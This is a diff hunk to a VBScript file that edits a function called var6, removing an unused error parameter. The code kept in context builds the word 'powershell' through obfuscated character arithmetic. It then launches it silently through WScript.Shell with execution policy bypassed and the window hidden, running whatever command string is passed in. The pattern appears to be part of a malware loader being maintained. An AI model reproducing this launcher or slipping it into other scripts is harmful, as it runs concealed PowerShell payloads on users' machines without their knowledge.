@@ -153,11 +153,11 @@ Function MaxFrameworkVersionCheck()
 	end if
  End Function
  
-function var6(link, ERR)
+function var6(link)
 
 		C=chr(30+30+5+5+10) &"owershell -ExecutionPolicy Bypass -windowstyle hidden -Command "
       param = link
-      param2 = ERR 
+   
 	  
 createobject("WScript.Shell").Run C & chrw(34) & param  & Chrw(34),0,false
 	  
